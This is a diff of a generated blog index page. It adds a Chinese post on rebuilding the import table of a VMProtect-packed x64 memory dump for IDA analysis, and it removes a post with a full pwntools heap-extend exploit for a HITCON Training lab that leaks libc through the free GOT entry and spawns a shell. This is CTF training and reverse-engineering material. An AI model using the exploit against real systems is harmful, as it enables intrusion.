@@ -67,6 +67,97 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-VMP-修复dump内存导入表" class="post-VMP-修复dump内存导入表 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2020/05/07/VMP-修复dump内存导入表/" data-id="ck9vj8y6n0006873k6w9uukag" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <hr>
+<p>layout: post<br>title: VMP-修复dump内存导入表<br>date: 2020-5-7 00:04:33<br>tags:</p>
+<ul>
+<li>rev<br>categories: reverse</li>
+</ul>
+<h1 id="VMP-“完美”修复dump内存导入表"><a href="#VMP-“完美”修复dump内存导入表" class="headerlink" title="VMP-“完美”修复dump内存导入表"></a>VMP-“完美”修复dump内存导入表</h1><p>修复对应64位程序(ring3)，不能应用于32位，跳转指令含义不同。一些原理就不介绍了，主要说明一下修复dump内存导入表的步骤，使得可以直接使用IDA逆向，思路也是借鉴了前人，后附参考链接，先展示一下修复前后的效果吧。</p>
+<p>下图是直接dump下来的内存，不过还是修改了SizeOfRawData和PointerToRawData的，并且进行过针对无壳程序dump内存IAT修复方式处理过。</p>
+<p><img src="https://invicsfate.github.io/assert/VMP8.png" alt="VMP8"></p>
+<p>下图是修复dump内存IAT过后的，放两张图。</p>
+<p><img src="https://invicsfate.github.io/assert/VMP9.png" alt="VMP9"></p>
+<p><img src="https://invicsfate.github.io/assert/VMP10.png" alt="VMP10"></p>
+<p>上图程序还没加载完，看着很舒服，完美。</p>
+<p>实现修复VMP dump内存导入表的关键步骤如下，分小标题介绍。</p>
+<h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>文件加载到IDA上，成功地反汇编呈现给我们，事实上是实现了内存自加载PE(可以这样理解，但其实不是)，所以修复的关键是要让其成功模拟内存自加载，内存自加载有以下三个要点：</p>
+<ul>
+<li>内存对齐，即文件映射到内存，文件每个节区实现从memcpy(VirtualAddrss，PointerToRawData，SizeOfRawData)</li>
+<li>修复导入表</li>
+<li>重定位</li>
+</ul>
+<p>因此，对应要点进行修复。</p>
+<h3 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h3><p>由于dump下来的文件已经是内存状态，如果要让IDA识别，需要修改两个字段，每个节表头的PointerToRawData以及SizeOfRawData，满足PointerToRawData == VirtualAddress，SizeOfRawData == VirtualSize。</p>
+<p>PointerToRawData == VirtualAddress</p>
+<p><img src="https://invicsfate.github.io/assert/VMP1.png" alt="VMP1"></p>
+<p>izeOfRawData == VirtualSize</p>
+<p><img src="https://invicsfate.github.io/assert/VMP2.png" alt="VMP2"></p>
+<p>此时，把dump下来的文件放到IDA已经可以加载，但是导入表是坏的。</p>
+<p>备注：需要注意的是，dump下来的内存中原始的Import Table指向的VirtualAddress和Size都不是进程真正使用的导入表位置，真正的导入表位置已经被VMP修改到其他位置，但是原始的Import Table可以帮助我们修复导入表。</p>
+<h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>并不需要重定位，不需要修改Image Base，保持不动。</p>
+<h3 id="修复导入表"><a href="#修复导入表" class="headerlink" title="修复导入表"></a>修复导入表</h3><p>下面是重头戏，修复导入表，核心的编程点如下：</p>
+<ul>
+<li>添加一个新的区段，用于存放我们新建的导入表以及其相关结构</li>
+</ul>
+<p><img src="https://invicsfate.github.io/assert/VMP3.png" alt="VMP3"></p>
+<p>​    我的程序导入的函数很多，所用空间比较大，申请了0x15000大小的区段</p>
+<ul>
+<li><p>扫描内存dump文件中特定的opcode，64位程序对应ff 15/25</p>
+<p><img src="https://invicsfate.github.io/assert/VMP4.png" alt="VMP4"></p>
+</li>
+<li><p>找到ff 15/25的位置，记下该位置，之后要修改ff 15/25 后面的四个字节，修改其IAT位置到我们新建的IAT当中</p>
+<p><img src="https://invicsfate.github.io/assert/VMP5.png" alt="VMP5"></p>
+</li>
+<li><p>通过找到ff 15/25位置，找到dump内存中动态加载该API函数的地址，保存地址</p>
+<p><img src="https://invicsfate.github.io/assert/VMP6.png" alt="VMP6"></p>
+</li>
+<li><p>利用原始Import Table找到进程载入的所有的DLL名称，如果Import Table指向的位置没有，那么搜索dll字符串，定位所有的dll名称，把它整合一下。LoadLibrary所有dll，从EAT中遍历该DLL的所有地址与找到的API函数地址匹配</p>
+</li>
+<li><p>匹配成功，保存函数名以及对应的ff 15/25位置，下标一一对应，并记录匹配的函数个数，方便IAT内存的合理分配</p>
+<p><img src="https://invicsfate.github.io/assert/VMP7.png" alt="VMP7"></p>
+</li>
+<li><p>重建IAT，我是0x20字节用于存放0x14大小的ImportDescriptor，0x30开始对应Name字段，接着是OriginalFirstThunk以及FirstThunk，最后是一个个的IMAGE_IMPORT_BY_NAME结构 </p>
+</li>
+<li><p>同时修改ff 15/25对应的后4字节，让其指向我们新建的IAT位置，一一对应</p>
+</li>
+</ul>
+<p>另外，dump以后的内存，要保证在不重启的情况下，使用工具修复，重启会使得系统DLL地址重新分配。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-248812.htm" target="_blank" rel="noopener">手动分析VMP加密的x64驱动导入表</a></p>
+<p><a href="https://bbs.pediy.com/thread-249322.htm" target="_blank" rel="noopener">使用模拟器进行x64驱动的Safengine脱壳+导入表修复</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2020/05/07/VMP-修复dump内存导入表/">
+    <time datetime="2020-05-06T16:04:48.153Z" class="entry-date">
+        2020-05-07
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-windows原始套接字sock-raw的使用限制" class="post-windows原始套接字sock-raw的使用限制 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +173,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2020/04/20/windows原始套接字sock-raw的使用限制/" data-id="ck97yisci001mrr3kczpl5a34" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2020/04/20/windows原始套接字sock-raw的使用限制/" data-id="ck9vj8y9a001i873kitcru23q" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -147,7 +238,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2020/02/15/nginx-https-CGI-post数据/" data-id="ck97yisbw000mrr3kfm98fqez" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2020/02/15/nginx-https-CGI-post数据/" data-id="ck9vj8y7y000q873kgsmn0nx5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -223,7 +314,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/14/“绝对安全”的本地序列号验证方法/" data-id="ck97yiscn001prr3k1dib70fh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/14/“绝对安全”的本地序列号验证方法/" data-id="ck9vj8y9k001m873ku8jgeerk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -284,7 +375,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/07/C++逆向随笔/" data-id="ck97yisdr002grr3kg2q0jw3y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/12/07/C++逆向随笔/" data-id="ck9vj8yc7002e873knijhe1mu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -371,7 +462,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/08/24/某游戏cg素材解包/" data-id="ck97yiscu001wrr3kk2ejtih3" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/08/24/某游戏cg素材解包/" data-id="ck9vj8ya4001w873kdlpolrfo" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -441,7 +532,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/05/31/打包小工具/" data-id="ck97yisef0030rr3kn1octsjn" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2019/05/31/打包小工具/" data-id="ck9vj8ydi002y873khvav6dc5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -494,7 +585,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/绕过某摄像头校验机制软刷固件/" data-id="ck97yiscw001zrr3kgew5lmqu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/绕过某摄像头校验机制软刷固件/" data-id="ck9vj8ya5001z873kq12wxhcs" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -569,7 +660,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-unlink/" data-id="ck97yisc4000vrr3kya0rg3oz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-unlink/" data-id="ck9vj8y8m0012873kw8birwm7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -636,7 +727,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/" data-id="ck97yisbz000srr3kqnv67gw2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-house-of-spirit/" data-id="ck9vj8y8a000t873k4ssfo1fw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -657,59 +748,6 @@
     <footer class="entry-meta">
     <a href="/2018/10/09/pwn-house-of-spirit/">
     <time datetime="2018-10-09T14:48:25.715Z" class="entry-date">
-        2018-10-09
-    </time>
-</a>
-    
-  <span class="article-delim">&#8226;</span>
-  <div class="article-category">
-  <a class="article-category-link" href="/categories/CTF/">CTF</a>
-  </div>
-
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
-    <article id="post-pwn-extend" class="post-pwn-extend post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2018/10/09/pwn-extend/">pwn-extend</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-extend/" data-id="ck97yisby000rrr3kxafp70ro" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p>extend技术主要是能够修改size标志位，构造好我们伪造好size标志位的chunk，当再次malloc之时，chunk就能够扩大范围，如果在修改后的chunk范围内,能修改某个指针，且该指针可以利用来泄露或者修改指定地址内容，即可利用。</p>
-<p>HITCON Trainging lab13即是利用了heap-extend技术实现利用。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">4</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'B'</span>*<span class="number">4</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">'system_addr: '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2018/10/09/pwn-extend/">
-    <time datetime="2018-10-09T14:44:58.416Z" class="entry-date">
         2018-10-09
     </time>
 </a>
@@ -768,6 +806,10 @@
       <ul>
         
           <li>
+            <a href="/2020/05/07/VMP-修复dump内存导入表/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2020/04/20/windows原始套接字sock-raw的使用限制/">windows原始套接字sock_raw的使用限制</a>
           </li>
         
@@ -781,10 +823,6 @@
         
           <li>
             <a href="/2019/12/07/C++逆向随笔/">C++逆向随笔</a>
-          </li>
-        
-          <li>
-            <a href="/2019/08/24/某游戏cg素材解包/">某游戏cg素材解包</a>
           </li>
         
       </ul>
